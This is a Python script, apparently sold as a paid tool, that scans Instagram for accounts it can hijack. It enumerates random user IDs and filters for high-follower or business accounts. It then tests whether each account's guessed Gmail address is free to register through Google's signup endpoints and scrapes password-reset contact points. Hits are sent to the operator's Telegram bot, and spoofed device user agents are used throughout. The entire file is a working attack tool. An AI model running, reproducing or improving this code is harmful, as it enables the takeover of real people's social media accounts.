#!/usr/bin/env python3
# ------------------------------------------------
# TEAM DARK ANIRUDH ✖ SARKAR ERA
# COLLAB EDITION - HIGH FOLLOW | HUGE POST | META BIZ | RANDOM YEAR
# ------------------------------------------------
# DEC BY @c0d_dark & @Anirudh_Bhai
# PAID FILE - AUTHORIZED USE ONLY
# ------------------------------------------------

import os
import sys
import re
import time
import random
import string
import json
import uuid
import base64
import hashlib
import threading
import requests
import httpx
from bs4 import BeautifulSoup
from rich.align import Align
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box
from rich.live import Live
from rich.text import Text
from rich.prompt import Prompt, IntPrompt, Confirm
from user_agent import generate_user_agent
from hashlib import md5
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

console = Console()

# ------------------------- CONFIG MANAGER -------------------------
class ConfigManager:
    O = '\x1b[38;5;208m'
    R = '\033[1;31m'
    X = '\033[1;33m'
    F = '\033[2;32m'
    C = "\033[1;97m"
    B = '\033[2;36m'
    K = '\033[2;35m'
    C1 = '\033[2;35m'
    Rn = "\033[0m"
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'

    TOKEN = ""
    CHAT_ID = ""

    UID_RANGES = {
        "1": (210468786, 269736186),    # 2012
        "2": (390438486, 495999999),    # 2013
        "3": (1479010000, 1679010000),  # 2014
        "4": (1700000000, 2400000000),  # 2015
        "5": (3313668786, 3713668786),  # 2016
        "6": (5398785217, 5999785217),  # 2017
        "7": (7497939245, 8597939245),  # 2018
        "8": (11254029834, 21254029834),# 2019
    }

    def __init__(self):
        self.console = Console()
        self.selected_year = None
        self.random_year = False
        self.min_followers = 0
        self.min_posts = 0
        self.meta_business_only = False
        self.filter_type = None  # 'no_posts' / 'with_posts' (optional, overridden by min_posts)
        self.uid_min = None
        self.uid_max = None
        self._show_banner()
        self._get_telegram_creds()
        self._select_year()
        self._select_advanced_filters()
        self._setup_uid_range()

    def _show_banner(self):
        self.console.clear()
        banner = Panel(
            "[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]\n"
            "[bold yellow]🔥  TEAM DARK ANIRUDH  ✖  SARKAR ERA  🔥[/bold yellow]\n"
            "[bold magenta]⚡  𝙄𝙉𝙎𝙏𝘼 𝘾𝙃𝙀𝘾𝙆𝙀𝙍  •  𝙃𝙄𝙂𝙃 𝙁𝙊𝙇𝙇𝙊𝙒  •  𝙃𝙐𝙂𝙀 𝙋𝙊𝙎𝙏  •  𝙈𝙀𝙏𝘼 𝘽𝙄𝙕𝙕  ⚡[/bold magenta]\n"
            "[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]\n"
            "[bold white]👑  Lead Dev : @c0d_dark (SARKAR PY)[/bold white]\n"
            "[bold white]🎀  Co-Dev   : @Anirudh_Bhai (TEAM DARK)[/bold white]\n"
            "[bold red]⚠️  PAID FILE - CONTACT @c0d_dark or @Anirudh_Bhai  ⚠️[/bold red]\n"
            "[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]",
            title="[bold green]🔥 WELCOME 🔥[/bold green]",
            border_style="cyan"
        )
        self.console.print(banner)

    def _get_telegram_creds(self):
        self.console.print()
        self.TOKEN = Prompt.ask(f"{self.CYAN}🤖 BOT TOKEN{self.RESET}")
        self.CHAT_ID = Prompt.ask(f"{self.CYAN}📱 CHAT ID{self.RESET}")
        self.console.clear()

    def _select_year(self):
        self.console.print()
        self.console.print(Panel(
            "[bold yellow]🎯 SELECT ACCOUNT CREATION YEAR[/bold yellow]\n\n"
            "[cyan][1][/cyan] 2012      [cyan][5][/cyan] 2016\n"
            "[cyan][2][/cyan] 2013      [cyan][6][/cyan] 2017\n"
            "[cyan][3][/cyan] 2014      [cyan][7][/cyan] 2018\n"
            "[cyan][4][/cyan] 2015      [cyan][8][/cyan] 2019\n"
            "[bold green][9][/bold green] [yellow]🎲 RANDOM YEAR (mix all ranges)[/yellow]",
            title="[bold cyan]⚙️ YEAR SELECTION[/bold cyan]",
            border_style="cyan"
        ))
        ch = Prompt.ask(f"{self.CYAN}> {self.RESET}", choices=["1","2","3","4","5","6","7","8","9"])
        if ch == "9":
            self.random_year = True
            self.selected_year = None
        else:
            self.selected_year = ch
        self.console.clear()

    def _select_advanced_filters(self):
        self.console.print()
        self.console.print(Panel(
            "[bold yellow]🔧 ADVANCED FILTERS[/bold yellow]\n"
            "[white]💪 HIGH FOLLOW    : minimum followers required[/white]\n"
            "[white]📸 HUGE POST      : minimum posts required[/white]\n"
            "[white]🏢 META BIZZ      : only business/verified accounts[/white]",
            title="[bold cyan]🎛️ FILTER CONFIGURATION[/bold cyan]",
            border_style="cyan"
        ))
        self.min_followers = IntPrompt.ask(f"{self.CYAN}👥 Minimum followers (0 = ignore){self.RESET}", default=0)
        self.min_posts = IntPrompt.ask(f"{self.CYAN}📸 Minimum posts (0 = ignore){self.RESET}", default=0)
        self.meta_business_only = Confirm.ask(f"{self.CYAN}🏢 Only Meta Business / Verified accounts?{self.RESET}", default=False)
        self.console.clear()

    def _setup_uid_range(self):
        if not self.random_year:
            self.uid_min, self.uid_max = self.UID_RANGES[self.selected_year]
        else:
            self.uid_min, self.uid_max = None, None  # will be random per user

    def get_random_range(self):
        """Return a random UID range when random year is enabled"""
        if self.random_year:
            year_key = random.choice(list(self.UID_RANGES.keys()))
            return self.UID_RANGES[year_key]
        return self.uid_min, self.uid_max


# ------------------------- GOOGLE CHECKER -------------------------
class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        self.token_ready = False
        Thread(target=self._refresh_token, daemon=True).start()
        
    def _generate_ua(self):
        return generate_user_agent()

    def _refresh_token(self):
        try:
            n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
            n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
            host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

            he3 = {
                "accept": "*/*",
                "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "user-agent": str(self._generate_ua()),
            }

            res1 = requests.get(
                'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                headers=he3
            )
            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)

            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                'user-agent': self._generate_ua(),
            }

            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }

            response = requests.post(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies,
                headers=headers,
                data=data,
            )

            tl = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']

            try:
                os.remove('tl.txt')
            except:
                pass

            with open('tl.txt', 'a') as f:
                f.write(tl + '//' + host + '\n')
        except Exception as e:
            self._refresh_token()

    def check_availability(self, email):
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            try:
                with open('tl.txt', 'r') as f:
                    o = f.read().splitlines()[0]
            except:
                self._refresh_token()
                with open('tl.txt', 'r') as f:
                    o = f.read().splitlines()[0]

            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
                'user-agent': self._generate_ua(),
            }

            params = {'TL': tl}
            data = f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'

            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )

            if '"gf.uar",1' in str(response.text):
                return 'good'
            elif '"er",null,null,null,null,400' in str(response.text):
                self._refresh_token()
                return self.check_availability(email)
            else:
                return 'bad'
        except:
            return self.check_availability(email)


# ------------------------- INSTAGRAM CHECKER -------------------------
class InstagramChecker:
    def __init__(self, google_checker: GoogleChecker, config: ConfigManager):
        self.google = google_checker
        self.config = config

    def _generate_android_ua(self):
        devices = [
            {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
            {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
            {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
            {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
            {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
            {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
            {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
            {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
            {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
            {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
        ]

        device = random.choice(devices)
        android_version = random.choice(["10", "11", "12", "13", "14"])
        api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
        dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
        width = random.choice(["720", "1080", "1440"])
        height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
        instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
        locale = random.choice(["en_US", "en_GB", "ar_SA"])
        random_num = random.randint(300000000, 400000000)

        return (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
                f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
                f"{device['device']}; {device['board']}; {locale}; {random_num})")

    def get_rest_info(self, username):
        """Extract recovery contact point"""
        android_ua = self._generate_android_ua()
        ig_did = str(uuid.uuid4()).upper()
        mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]

        headers = {
            "User-Agent": android_ua,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ig-app-id": "567067343352427",
            "x-ig-device-id": ig_did,
            "x-ig-connection-type": "WIFI",
            "x-ig-capabilities": "3brTvw==",
            "x-ig-www-claim": "0",
            "x-requested-with": "XMLHttpRequest",
            "x-instagram-ajax": str(random.randint(1000000000, 9999999999)),
            "x-csrftoken": "missing",
            "Origin": "https://www.instagram.com",
            "Referer": "https://instagram.com/accounts/password/reset/?source=fxcal",
            "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
        }

        try:
            r = httpx.Client(http2=True, headers=headers, timeout=20).post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            ).text
            data = json.loads(r)
            if "contact_point" in data:
                return data["contact_point"]
        except:
            pass
        return "No Rest"

    def fetch_profile(self, username, domain):
        url = f'https://www.instagram.com/{username}/'
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            meta_description = soup.find('meta', attrs={'name': 'description'})
            name_tag = soup.find('meta', property='og:title')

            if meta_description and name_tag:
                content = meta_description.get('content').replace(',', '')
                parts = content.split()
                return {
                    'name': name_tag['content'].split('(@')[0].strip(),
                    'username': username,
                    'email': f"{username}@{domain}",
                    'followers': parts[0],
                    'following': parts[2],
                    'posts': parts[4],
                    'url': url,
                    'rest': self.get_rest_info(username)
                }
        except:
            pass
        return {
            'username': username,
            'email': f"{username}@{domain}",
            'url': url,
            'rest': self.get_rest_info(username)
        }

    def check_email(self, email):
        android_ua = self._generate_android_ua()
        url = "https://i.instagram.com/api/v1/users/check_email/"
        headers = {
            'User-Agent': android_ua,
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
        }
        try:
            response = httpx.Client(http2=True).post(url, data=f"email={email}", headers=headers)
            if 'email_is_taken' in str(response.text):
                return True
            return False
        except:
            return False


# ------------------------- DISPLAY MANAGER (ENHANCED UI) -------------------------
class DisplayManager:
    def __init__(self, config: ConfigManager):
        self.config = config
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0
        self.processed = 0
        self.current_email = ""
        self.results = []
        self.lock = threading.Lock()
        self._start_display_thread()

    def _start_display_thread(self):
        def update_loop():
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Scanning...", total=None)
                while True:
                    with self.lock:
                        stats_text = (
                            f"{self.config.GREEN}✅ Hits: {self.hits}{self.config.RESET} | "
                            f"{self.config.RED}❌ Bad Insta: {self.bad_insta}{self.config.RESET} | "
                            f"{self.config.YELLOW}⚠️ Bad Email: {self.bad_email}{self.config.RESET} | "
                            f"{self.config.CYAN}🔄 Processed: {self.processed}{self.config.RESET}\n"
                            f"{self.config.MAGENTA}📧 Current: {self.current_email}{self.config.RESET}"
                        )
                        console.print(Panel(stats_text, title="[bold white]LIVE STATS[/bold white]", border_style="cyan"))
                    time.sleep(1.5)

        Thread(target=update_loop, daemon=True).start()

    def update_stats(self, hits=None, bad_insta=None, bad_email=None, processed=None, current_email=None):
        with self.lock:
            if hits is not None: self.hits = hits
            if bad_insta is not None: self.bad_insta = bad_insta
            if bad_email is not None: self.bad_email = bad_email
            if processed is not None: self.processed = processed
            if current_email is not None: self.current_email = current_email

    def print_hit(self, msg):
        with self.lock:
            console.print("\n" + "="*60)
            console.print(Panel(msg, title="[bold green]🔥 HIT DETECTED 🔥[/bold green]", border_style="green"))
            console.print("="*60 + "\n")


# ------------------------- REPORT MANAGER -------------------------
class ReportManager:
    def __init__(self, config: ConfigManager):
        self.config = config

    def send_telegram(self, msg):
        try:
            requests.get(
                f"https://api.telegram.org/bot{self.config.TOKEN}/sendMessage",
                params={"chat_id": self.config.CHAT_ID, "text": msg, "parse_mode": "HTML"},
                timeout=10
            )
        except:
            pass

    def save_to_file(self, msg, filename='hits_sarkar.txt'):
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{msg}\n')
            f.write("-"*50 + "\n")

    def format_result(self, data, year, filter_info):
        if 'name' in data:
            msg = f'''
╭━━━〔 🔥 • 𝙄𝙉𝙎𝙏𝘼 𝘿𝘼𝙏𝘼 🔥 〕━━━╮
👤 Name      : {data['name']}
👑 Username  : @{data['username']}
📧 Email     : {data['email']}
━━━━━━━━━━━━━━━━━━━━━
👥 Followers : {data['followers']}
🔄 Following : {data['following']}
📸 Posts     : {data['posts']}
📊 Restore   : {data['rest']}
━━━━━━━━━━━━━━━━━━━━━
🔗 Link : https://instagram.com/{data['username']}
╰━━━〔 ⚡ TEAM DARK ✖ SARKAR ERA ⚡ 〕━━━╯
'''
        else:
            msg = f'''
╭━━━〔 💠 • 𝙄𝙉𝙎𝙏𝘼 𝘿𝘼𝙏𝘼 💠 〕━━━╮
🪪 Username : @{data['username']}
✉️ Email    : {data['email']}
🌍 Profile  : instagram.com/{data['username']}
📊 Restore  : {data['rest']}
╰━━━〔 🖤 @c0d_dark | @Anirudh_Bhai 🖤 〕━━━╯
'''
        return msg


# ------------------------- USER COLLECTOR (ENHANCED) -------------------------
class UserCollector:
    def __init__(self, config: ConfigManager, insta_checker: InstagramChecker,
                 display: DisplayManager, reporter: ReportManager):
        self.config = config
        self.insta = insta_checker
        self.display = display
        self.reporter = reporter

        self.found_usernames = set()
        self.processed_ids = set()
        self.lock = threading.Lock()
        self.hits = 0
        self.bad_insta = 0
        self.bad_email = 0
        self.processed = 0

    def _get_year_display(self):
        if self.config.selected_year:
            year_map = {"1": 2012, "2": 2013, "3": 2014, "4": 2015,
                        "5": 2016, "6": 2017, "7": 2018, "8": 2019}
            return year_map[self.config.selected_year]
        return "Random"

    def _should_skip_user(self, user_data):
        username = user_data.get('username', '')
        if '_' in username or len(username) < 8:
            return True

        is_private = user_data.get('is_private', True)
        follower_count = user_data.get('follower_count', 0)
        following_count = user_data.get('following_count', 0)
        media_count = user_data.get('media_count', 0)
        is_business = user_data.get('is_business', False)
        is_verified = user_data.get('is_verified', False)

        # Apply filters
        if self.config.min_followers > 0 and follower_count < self.config.min_followers:
            return True
        if self.config.min_posts > 0 and media_count < self.config.min_posts:
            return True
        if self.config.meta_business_only and not (is_business or is_verified):
            return True

        # Original filter (No posts / With posts) - only if min_posts=0
        if self.config.min_posts == 0 and self.config.filter_type:
            if self.config.filter_type == "1" and media_count > 0:
                return True
            if self.config.filter_type == "2" and media_count == 0:
                return True
        return False

    def _generate_user_agent(self):
        rnd = str(random.randint(150, 999))
        return ("Instagram 311.0.0.32.118 Android ("
                + random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"])
                + "; " + str(random.randint(100, 1300)) + "dpi; "
                + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; "
                + random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME", "INFINIX"])
                + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"
                + str(random.randint(111, 999)) + ")")

    def _get_random_id(self):
        while True:
            if self.config.random_year:
                uid_min, uid_max = self.config.get_random_range()
            else:
                uid_min, uid_max = self.config.uid_min, self.config.uid_max
            uid = str(random.randrange(uid_min, uid_max))
            with self.lock:
                if uid not in self.processed_ids:
                    self.processed_ids.add(uid)
                    return uid

    def _process_user(self):
        while True:
            try:
                uid = self._get_random_id()
                lsd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': self._generate_user_agent(),
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd,
                }

                data = {
                    'lsd': lsd,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': f'{{"userID":"{uid}","username":"cristiano"}}',
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001',
                }

                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)

                try:
                    resp_json = response.json()
                except:
                    continue

                user_data = resp_json.get('data', {}).get('user', {})
                if not user_data or not user_data.get('username'):
                    continue

                username = user_data['username']

                with self.lock:
                    if username in self.found_usernames:
                        continue

                # Apply advanced filters
                if self._should_skip_user(user_data):
                    continue

                with self.lock:
                    self.found_usernames.add(username)
                    self.processed += 1

                email = f"{username}@gmail.com"
                self.display.update_stats(current_email=email, processed=self.processed)

                if self.insta.check_email(email):
                    if self.insta.google.check_availability(email) == 'good':
                        profile_data = self.insta.fetch_profile(username, "gmail.com")

                        with self.lock:
                            self.hits += 1
                            if self.hits % 10 == 0 and os.path.exists("tl.txt"):
                                os.remove("tl.txt")

                        self.display.update_stats(hits=self.hits)

                        year_info = self._get_year_display()
                        filter_info = f"Min Followers:{self.config.min_followers} Min Posts:{self.config.min_posts}"
                        msg = self.reporter.format_result(profile_data, year_info, filter_info)
                        self.display.print_hit(msg)
                        self.reporter.send_telegram(msg)
                        self.reporter.save_to_file(msg)
                    else:
                        with self.lock:
                            self.bad_email += 1
                        self.display.update_stats(bad_email=self.bad_email)
                else:
                    with self.lock:
                        self.bad_insta += 1
                    self.display.update_stats(bad_insta=self.bad_insta)

            except Exception:
                continue

    def start(self, thread_count=75):
        threads = []
        for _ in range(thread_count):
            t = Thread(target=self._process_user)
            t.daemon = True
            t.start()
            threads.append(t)
        return threads


# ------------------------- MAIN -------------------------
def main():
    console.print(Panel("[bold red]⚠️  PAID FILE - Licensed to TEAM DARK & SARKAR ERA  ⚠️[/bold red]", border_style="red"))
    time.sleep(1.5)
    config = ConfigManager()
    google_checker = GoogleChecker()
    insta_checker = InstagramChecker(google_checker, config)
    display = DisplayManager(config)
    reporter = ReportManager(config)
    collector = UserCollector(config, insta_checker, display, reporter)

    console.print(Panel("[bold green]🚀 STARTING SCANNER...[/bold green]", border_style="green"))
    threads = collector.start(thread_count=75)  # More threads for speed

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[bold red]⛔ SCANNER STOPPED BY USER[/bold red]")
        sys.exit(0)

if __name__ == "__main__":
    main()

# ------------------------------------------------
# END OF COLLAB FILE - @c0d_dark | @Anirudh_Bhai
# ------------------------------------------------
